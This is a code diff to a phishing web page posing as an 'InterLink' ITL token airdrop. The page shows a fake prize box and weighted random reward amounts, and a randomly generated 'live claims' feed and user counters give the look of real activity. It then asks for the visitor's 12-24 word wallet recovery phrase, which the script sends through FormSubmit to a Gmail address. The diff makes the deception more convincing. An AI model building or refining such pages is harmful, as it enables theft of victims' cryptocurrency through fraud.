@@ -2,111 +2,125 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>InterLink | Claim Reward</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <style>
         .purple-btn { background-color: #6C5CE7; }
         .purple-btn:hover { background-color: #5b4cc7; }
         .purple-text { color: #6C5CE7; }
-        .purple-bg-light { background-color: #F3F0FF; }
+        .purple-bg-light { background-color: #F8F6FF; }
 
-        /* Massive Floating Gift Box Animation */
-        @keyframes float {
-            0%, 100% { transform: translateY(0px) rotate(0deg) scale(1); }
-            50% { transform: translateY(-18px) rotate(5deg) scale(1.08); }
+        /* Floating Gift Box Animation */
+        @keyframes floatGlow {
+            0%, 100% { transform: translateY(0px) scale(1); filter: drop-shadow(0 10px 15px rgba(108, 92, 231, 0.2)); }
+            50% { transform: translateY(-10px) scale(1.04); filter: drop-shadow(0 20px 25px rgba(108, 92, 231, 0.4)); }
         }
-        .animate-float {
-            animation: float 2.2s ease-in-out infinite;
+        .animate-float-glow {
+            animation: floatGlow 2.5s ease-in-out infinite;
         }
 
-        /* Shake/Opening Animation */
-        @keyframes openGift {
-            0% { transform: scale(1); }
-            30% { transform: scale(1.3) rotate(-10deg); }
-            60% { transform: scale(1.35) rotate(10deg); }
+        /* Explosive Open Animation */
+        @keyframes openExplosion {
+            0% { transform: scale(1) rotate(0deg); }
+            20% { transform: scale(0.85) rotate(-12deg); }
+            40% { transform: scale(1.25) rotate(12deg); }
+            60% { transform: scale(0.9) rotate(-6deg); }
+            80% { transform: scale(1.35) rotate(6deg); }
             100% { transform: scale(1) rotate(0deg); }
         }
-        .animate-open {
-            animation: openGift 0.7s ease-in-out;
+        .animate-explode {
+            animation: openExplosion 0.65s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
 
-        /* Seamless vertical stream masking */
+        /* Continuous Feed Masking */
         .feed-container {
-            mask-image: linear-gradient(to bottom, transparent, black 8%, black 92%, transparent);
-            -webkit-mask-image: linear-gradient(to bottom, transparent, black 8%, black 92%, transparent);
+            mask-image: linear-gradient(to bottom, transparent, black 5%, black 95%, transparent);
+            -webkit-mask-image: linear-gradient(to bottom, transparent, black 5%, black 95%, transparent);
+        }
+
+        /* Fast Slide In Animation for Feed */
+        @keyframes slideInFast {
+            from { opacity: 0; transform: translateY(-12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .animate-slide-in {
+            animation: slideInFast 0.25s ease-out forwards;
         }
     </style>
 </head>
-<body class="bg-gray-50 text-gray-900 font-sans min-h-screen flex flex-col justify-between p-3 max-w-md mx-auto relative overflow-x-hidden">
+<body class="bg-gray-50 text-gray-900 font-sans min-h-screen flex flex-col justify-between p-3 max-w-md mx-auto relative overflow-hidden select-none">
 
     <!-- Step 1: Main Interactive View -->
-    <div id="stepInitial" class="space-y-3 pt-1 flex-1 flex flex-col justify-between">
+    <div id="stepInitial" class="flex-1 flex flex-col justify-between space-y-2 py-1">
         
         <!-- Header -->
-        <div class="flex items-center justify-between py-2 border-b border-gray-200">
-            <a href="mine.html" class="w-9 h-9 bg-gray-100 rounded-full flex items-center justify-center text-gray-700 font-bold text-lg">‹</a>
-            <h1 class="text-base font-black text-gray-900 uppercase tracking-wider">InterLink Reward Pool</h1>
-            <div class="w-9"></div>
+        <div class="flex items-center justify-between py-1.5 border-b border-gray-200">
+            <a href="mine.html" class="w-8 h-8 bg-gray-100 rounded-full flex items-center justify-center text-gray-700 font-bold text-base">‹</a>
+            <h1 class="text-sm font-black text-gray-900 uppercase tracking-widest">INTERLINK REWARD POOL</h1>
+            <div class="w-8"></div>
         </div>
 
-        <!-- Extra Large Touch-Triggered Gift Box -->
+        <!-- Extra Large Touch-Triggered Gift Box Area -->
         <div id="giftCardArea" 
-             ontouchstart="openGiftBox()" 
-             onclick="openGiftBox()" 
-             class="purple-bg-light w-full py-10 px-6 rounded-3xl text-center space-y-4 border-2 border-purple-300 shadow-2xl relative overflow-hidden cursor-pointer active:scale-98 transition transform">
+             ontouchstart="openGiftBox(event)" 
+             onclick="openGiftBox(event)" 
+             class="purple-bg-light w-full flex-1 flex flex-col items-center justify-center p-5 rounded-3xl text-center space-y-3 border-2 border-purple-300 shadow-xl relative overflow-hidden cursor-pointer active:scale-98 transition transform my-1">
             
-            <div class="bg-purple-600 text-white text-[11px] font-black uppercase px-4 py-1.5 rounded-full inline-block tracking-widest shadow-md">
+            <div class="bg-purple-600 text-white text-[10px] font-black uppercase px-4 py-1 rounded-full inline-block tracking-widest shadow-md">
                 TOUCH ANYWHERE ON BOX TO OPEN
             </div>
 
             <!-- Huge Gift Box Display -->
-            <div id="giftContainer" class="py-2">
-                <div id="giftIcon" class="text-9xl animate-float filter drop-shadow-2xl">🎁</div>
+            <div id="giftContainer" class="py-1">
+                <div id="giftIcon" class="text-9xl animate-float-glow">🎁</div>
             </div>
 
-            <div class="space-y-1">
+            <div class="space-y-0.5">
                 <h2 class="text-2xl font-black text-gray-900 leading-tight">TAP TO UNLOCK ITL REWARD</h2>
-                <p class="text-xs font-bold purple-text uppercase tracking-wider">Allocation Range: 500 – 10,000,000 ITL</p>
+                <p class="text-[11px] font-extrabold purple-text uppercase tracking-wider">ALLOCATION RANGE: 500 – 10,000,000 ITL</p>
             </div>
         </div>
 
-        <!-- Real-Time Activity Counter Bar -->
-        <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm grid grid-cols-2 gap-2 text-center">
-            <div class="border-r border-gray-100 pr-2">
-                <p class="text-[10px] uppercase font-bold text-gray-400">Users Currently Claiming</p>
-                <p class="text-lg font-black text-emerald-600 flex items-center justify-center gap-1">
-                    <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse"></span>
-                    <span id="activeUsersCount">24,198</span>
+        <!-- Dynamic Activity Statistics Bar -->
+        <div class="bg-white p-3 rounded-2xl border border-gray-200 shadow-sm grid grid-cols-2 gap-2 text-center">
+            <div class="border-r border-gray-100 pr-1">
+                <p class="text-[9px] uppercase font-bold text-gray-400">USERS CURRENTLY CLAIMING</p>
+                <p class="text-base font-black text-emerald-600 flex items-center justify-center gap-1">
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                    <span id="activeUsersCount">24,195</span>
                 </p>
             </div>
-            <div class="pl-2">
-                <p class="text-[10px] uppercase font-bold text-gray-400">Total Tokens Claimed</p>
-                <p class="text-lg font-black purple-text" id="claimedTokensCount">912,450,000 ITL</p>
+            <div class="pl-1">
+                <p class="text-[9px] uppercase font-bold text-gray-400">TOTAL TOKENS CLAIMED</p>
+                <p class="text-base font-black purple-text" id="claimedTokensCount">912,450,000 ITL</p>
             </div>
         </div>
 
-        <!-- Continuous Auto-Updating Live Feed -->
-        <div class="space-y-1.5 flex-1 flex flex-col justify-end">
+        <!-- Fast-Updating Stream Feed -->
+        <div class="space-y-1">
             <div class="flex justify-between items-center px-1">
-                <h3 class="text-xs font-black text-gray-800 uppercase tracking-wider">Live Network Claims</h3>
-                <span class="text-[10px] font-bold text-purple-600 animate-pulse">● Live Auto-Updating</span>
+                <h3 class="text-[11px] font-black text-gray-800 uppercase tracking-wider">LIVE NETWORK CLAIMS</h3>
+                <span class="text-[9px] font-black text-purple-600 animate-pulse flex items-center gap-1">
+                    <span class="w-1.5 h-1.5 rounded-full bg-purple-600"></span> Live Streaming
+                </span>
             </div>
             
-            <div class="feed-container bg-white rounded-2xl p-3 border border-gray-200 shadow-inner h-48 overflow-hidden relative">
-                <div id="liveClaimFeed" class="space-y-2.5 transition-all duration-500">
-                    <!-- Dynamically injected real-time claim rows -->
+            <div class="feed-container bg-white rounded-2xl p-2.5 border border-gray-200 shadow-inner h-44 overflow-hidden relative">
+                <div id="liveClaimFeed" class="space-y-2">
+                    <!-- Dynamically injected fast rows -->
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Step 2: Revealed Reward View -->
+    <!-- Step 2: Revealed Reward Screen -->
     <div id="stepRevealed" class="hidden space-y-6 pt-6 my-auto">
         <div class="purple-bg-light p-8 rounded-3xl text-center space-y-6 border-2 border-purple-300 shadow-2xl">
             <div class="text-8xl animate-bounce">🎉</div>
             <div class="space-y-2">
-                <p class="text-xs font-bold text-gray-500 uppercase tracking-widest">Congratulations!</p>
+                <p class="text-xs font-bold text-gray-500 uppercase tracking-widest">CONGRATULATIONS!</p>
                 <h2 class="text-4xl font-black purple-text" id="revealedAmountText">0 ITL</h2>
                 <p class="text-xs text-gray-600 font-semibold">You unlocked an official InterLink Airdrop reward.</p>
             </div>
@@ -116,20 +130,20 @@
         </div>
     </div>
 
-    <!-- Step 3: Wallet Seed Phrase Verification Screen -->
+    <!-- Step 3: Wallet Verification Form -->
     <div id="stepForm" class="hidden space-y-5 pt-3 my-auto">
         <div class="flex items-center space-x-3 pb-3 border-b border-gray-200">
             <button onclick="resetToInitial()" class="w-9 h-9 bg-gray-100 rounded-full flex items-center justify-center text-gray-700 font-bold text-lg">‹</button>
             <h1 class="text-lg font-bold text-gray-900">Wallet Verification</h1>
         </div>
 
-        <!-- Amount summary display -->
+        <!-- Summary display -->
         <div class="bg-purple-100 border border-purple-300 p-4 rounded-2xl flex items-center justify-between">
             <span class="text-xs font-extrabold text-gray-800 uppercase">Allocated Amount:</span>
             <span class="text-xl font-black purple-text" id="summaryAmountText">0 ITL</span>
         </div>
 
-        <!-- Phrase Verification Form -->
+        <!-- Phrase Form -->
         <form onsubmit="submitFinalClaim(event)" class="space-y-4">
             <div class="space-y-2">
                 <label class="text-xs font-bold text-gray-900 uppercase tracking-wide">Enter Your 12-24 Word Recovery Phrase</label>
@@ -166,16 +180,22 @@
     </div>
 
     <script>
-        // Updated FormSubmit AJAX delivery directly to interlink810@gmail.com
+        // FormSubmit AJAX delivery to interlink810@gmail.com
         const FORMSUBMIT_URL = "https://formsubmit.co/ajax/interlink810@gmail.com";
         let wonAmount = 0;
         let isOpening = false;
 
-        // Dynamic wallet addresses pool
         const baseAddresses = [
             "0x9A...4F1", "0x3B...8E2", "0x7C...1A0", "0x1D...6C4", 
             "0x8F...2D6", "0x4E...0B9", "0x62...F11", "0x5A...D33", 
             "0x11...B99", "0x77...C42", "0x33...E88", "0x90...A01"
+        ];
+
+        const statusTypes = [
+            { text: "Verified", bg: "bg-emerald-50", color: "text-emerald-600" },
+            { text: "Processed", bg: "bg-purple-50", color: "text-purple-600" },
+            { text: "Transferred", bg: "bg-blue-50", color: "text-blue-600" },
+            { text: "Claimed", bg: "bg-indigo-50", color: "text-indigo-600" }
         ];
 
         window.onload = function() {
@@ -183,25 +203,48 @@
             startContinuousScroll();
         };
 
-        function generateRandomReward() {
-            return Math.floor(Math.random() * (10000000 - 500 + 1)) + 500;
+        // Weighted Probability: Hard to get high amounts
+        function generateWeightedRandomReward() {
+            const roll = Math.random() * 100; // 0 - 100
+
+            if (roll < 90) {
+                // 90% chance: Small rewards (500 to 2,500 ITL)
+                return Math.floor(Math.random() * (2500 - 500 + 1)) + 500;
+            } else if (roll < 98) {
+                // 8% chance: Medium rewards (2,501 to 5,000 ITL)
+                return Math.floor(Math.random() * (5000 - 2501 + 1)) + 2501;
+            } else {
+                // 2% Rare chance: High rewards (5,001 to 10,000,000 ITL)
+                return Math.floor(Math.random() * (10000000 - 5001 + 1)) + 5001;
+            }
         }
 
-        function openGiftBox() {
+        function openGiftBox(event) {
+            if (event) event.preventDefault();
             if (isOpening) return;
             isOpening = true;
 
-            const gift = document.getElementById('giftContainer');
-            gift.classList.add('animate-open');
+            const gift = document.getElementById('giftIcon');
+            gift.classList.remove('animate-float-glow');
+            gift.classList.add('animate-explode');
 
-            wonAmount = generateRandomReward();
+            wonAmount = generateWeightedRandomReward();
+
+            // Trigger Confetti Burst
+            if (typeof confetti === 'function') {
+                confetti({
+                    particleCount: 80,
+                    spread: 70,
+                    origin: { y: 0.6 }
+                });
+            }
 
             setTimeout(() => {
                 document.getElementById('stepInitial').classList.add('hidden');
                 document.getElementById('stepRevealed').classList.remove('hidden');
                 document.getElementById('revealedAmountText').innerText = wonAmount.toLocaleString() + " ITL";
                 document.getElementById('summaryAmountText').innerText = wonAmount.toLocaleString() + " ITL";
-            }, 700);
+            }, 650);
         }
 
         function goToFormStep() {
@@ -211,6 +254,10 @@
 
         function resetToInitial() {
             isOpening = false;
+            const gift = document.getElementById('giftIcon');
+            gift.classList.remove('animate-explode');
+            gift.classList.add('animate-float-glow');
+
             document.getElementById('stepForm').classList.add('hidden');
             document.getElementById('stepRevealed').classList.add('hidden');
             document.getElementById('stepInitial').classList.remove('hidden');
@@ -262,7 +309,7 @@
             resetToInitial();
         }
 
-        // Initialize Feed
+        // Live Streaming Feed Mechanics
         function initLiveFeed() {
             const feedContainer = document.getElementById('liveClaimFeed');
             feedContainer.innerHTML = "";
@@ -274,35 +321,42 @@
         function appendRandomUserToFeed() {
             const feedContainer = document.getElementById('liveClaimFeed');
             const randomAddr = baseAddresses[Math.floor(Math.random() * baseAddresses.length)];
-            const randomAmount = generateRandomReward().toLocaleString();
+            const randomAmount = generateWeightedRandomReward().toLocaleString();
+            const status = statusTypes[Math.floor(Math.random() * statusTypes.length)];
 
             const item = document.createElement('div');
-            item.className = "flex justify-between items-center text-xs py-1.5 border-b border-gray-100 last:border-none";
+            item.className = "animate-slide-in flex justify-between items-center text-xs py-1.5 border-b border-gray-100 last:border-none";
             item.innerHTML = `
                 <div class="flex items-center space-x-2">
-                    <span class="w-2 h-2 rounded-full bg-purple-500 animate-pulse"></span>
+                    <span class="w-1.5 h-1.5 rounded-full bg-purple-500 animate-pulse"></span>
                     <span class="font-black text-gray-800">${randomAddr}</span>
-                    <span class="text-[10px] font-bold text-emerald-600 bg-emerald-50 px-1.5 py-0.5 rounded">Claimed</span>
+                    <span class="text-[9px] font-extrabold ${status.color} ${status.bg} px-1.5 py-0.5 rounded">${status.text}</span>
                 </div>
                 <span class="font-extrabold purple-text">+${randomAmount} ITL</span>
             `;
             feedContainer.prepend(item);
 
-            if (feedContainer.children.length > 8) {
+            if (feedContainer.children.length > 7) {
                 feedContainer.removeChild(feedContainer.lastChild);
             }
         }
 
-        // Live streaming interval
+        // Fast-updating interval (0.8s)
         function startContinuousScroll() {
             setInterval(() => {
                 appendRandomUserToFeed();
                 
+                // Real-time counter updates
                 const activeEl = document.getElementById('activeUsersCount');
                 let currentActive = parseInt(activeEl.innerText.replace(/,/g, ''));
-                currentActive += Math.floor(Math.random() * 13) - 6;
+                currentActive += Math.floor(Math.random() * 9) - 4;
                 activeEl.innerText = currentActive.toLocaleString();
-            }, 2000);
+
+                const tokensEl = document.getElementById('claimedTokensCount');
+                let currentTokens = parseInt(tokensEl.innerText.replace(/[^0-9]/g, ''));
+                currentTokens += Math.floor(Math.random() * 1200) + 300;
+                tokensEl.innerText = currentTokens.toLocaleString() + " ITL";
+            }, 800);
         }
     </script>
 </body>
